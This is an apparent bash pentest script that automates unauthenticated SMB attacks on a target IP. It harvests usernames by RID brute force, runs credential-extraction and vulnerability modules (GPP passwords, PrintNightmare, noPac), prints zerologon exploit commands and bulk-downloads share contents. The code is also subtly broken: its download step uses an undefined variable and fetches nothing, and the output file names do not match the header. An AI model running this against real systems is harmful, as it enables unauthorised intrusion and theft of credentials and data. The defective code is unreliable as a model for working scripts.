#!/usr/bin/env bash
# File: noauth_smb
# Author: strikoder
#
# Description:
#   Automated SMB enumeration with no authentication (null / anonymous).
#   Runs basic recon, checks for misconfigurations, extracts usernames,
#   and attempts recursive downloads from accessible shares.
#
# Usage:
#   ./no_auth_smb.sh <IP>
#
# Workflow:
#   1) NetBIOS discovery with nmblookup
#   2) SMB version and safe NSE scripts with nmap
#   3) smbclient (null/anonymous) share listing
#   4) rpcclient enumeration (srvinfo, lsaquery, enumdomains, users, groups)
#   5) NetExec RID brute (saves usernames.txt)
#   6) Run common NetExec modules (gpp_password, gpp_autologin, smb_ghost, printnightmare, remove-mic, nopac)
#   7) NetExec password policy checks (--pass-pol) with null/anonymous
#   8) enum4linux-ng full enum (-A)
#   9) smbmap share permission listing
#   10) smbclient recursive download from accessible shares
#
# Output:
#   results_noauth_smb/
#     - ldap_usernames.txt    : usernames from RID brute
#     - downloads/*           : recursively pulled share contents
#   All command output is shown live in the terminal.
#
# Notes:
#   - Requires: nmblookup, nmap,

set -euo pipefail

if [[ $# -ne 1 ]]; then
  echo "Usage: $0 <IP>"
  exit 1
fi

IP="$1"
OUT_DIR="results_noauth_smb"
DOWNLOAD_DIR="${OUT_DIR}/downloads"
USERNAMES_FILE="${OUT_DIR}/usernames.txt"
RID_TMP="$(mktemp)"
trap 'rm -f "$RID_TMP"' EXIT

mkdir -p "${OUT_DIR}" "${DOWNLOAD_DIR}"

log() { echo -e "[*] $*"; }

log "Output directory: ${OUT_DIR}"

# 1) NetBIOS names
log "Running NetBIOS discovery (nmblookup)"
nmblookup -A "${IP}" || true
echo

# 2) SMB version & safe NSE
log "nmap safe SMB scripts"
nmap -Pn -p445 -sV --script "smb-protocols,smb2-time,smb2-security-mode,smb2-capabilities,smb-vuln-ms17-010" "$IP" || true
echo

# 3) smbclient null session share list
log "Listing shares with smbclient -L (null session)"
SHARE_ENUM="$(smbclient -N -L "\\\\${IP}\\" 2>/dev/null || true)"
echo "${SHARE_ENUM}"
echo

# 4) rpcclient null session basics
log "rpcclient basics"
{
  echo "srvinfo"
  echo "lsaquery"
  echo "enumdomains"
  echo "querydominfo"
  echo "enumdomusers"
  echo "enumdomgroups"
} | rpcclient -U "" -N "$IP" || true
echo

# 5) NetExec RID brute
log "Running RID brute with NetExec (saving usernames)"
for USER in "" "anonymous"; do
  CREDS_LABEL="null"
  [[ -n "$USER" ]] && CREDS_LABEL="$USER"
  log "  NetExec RID brute as '${CREDS_LABEL}'"
  nxc smb "${IP}" -u "${USER}" -p '' --rid-brute >> "${RID_TMP}" || true
done

awk '{print $6}' "${RID_TMP}" | grep -vE '^\s*$' | sort -u > "${USERNAMES_FILE}"

log "Saved usernames to ${USERNAMES_FILE}"
echo

# 5a) Run selected modules (always with -M)
MODULES=(gpp_password gpp_autologin smb_ghost printnightmare remove-mic nopac)

for MODULE in "${MODULES[@]}"; do
  log "Running NetExec module: ${MODULE}"
  nxc smb "${IP}" -u '' -p '' -M "${MODULE}" || true
  nxc smb "${IP}" -u 'anonymous' -p '' -M "${MODULE}" || true
done
echo

# 5b) Password policy checks (no-auth variants)
log "Checking SMB password policy with NetExec"
nxc smb "${IP}" -u '' -p '' --pass-pol || true
nxc smb "${IP}" -u 'anonymous' -p '' --pass-pol || true
echo


# 6) enum4linux-ng
log "Running enum4linux-ng -A"
enum4linux-ng -A "${IP}" || true
echo

# 7) smbmap
log "Checking share permissions with smbmap"
smbmap -H "${IP}" -u ' ' -p ' ' || true
echo

# 8) Full pulls via smbclient
log "Downloading everything possible via smbclient to: $OUT/downloads"
if [[ ${#ALL_SHARES[@]} -eq 0 ]]; then
  readarray -t ALL_SHARES < <(smbclient -N -L "\\\\$IP\\" \
    | awk '/\s+Disk\s/ {print $1}' | sort -u)
fi

# 9) Summary
echo
log "Finished SMB enumeration on ${IP}"
log "Summary:"
[[ -f "${USERNAMES_FILE}" ]] && log "  - Usernames: ${USERNAMES_FILE}"
[[ -d "${DOWNLOAD_DIR}" ]] && log "  - Downloads: ${DOWNLOAD_DIR}"
log "  - Manual exploit (lab only):"
log "      nxc smb ${IP} -u '' -p '' -M zerologon"
log "      nxc smb ${IP} -u anonymous -p '' -M zerologon"
log " ### Re-download accessible shares later with: ###"
log "for s in ${ALL_SHARES[*]}; do d=\${s//\\\$}; mkdir -p \"downloads/\$d\"; smbclient -N \"//${IP}/\$s\" -c \"lcd downloads/\$d; recurse ON; prompt OFF; mget *\"; done"
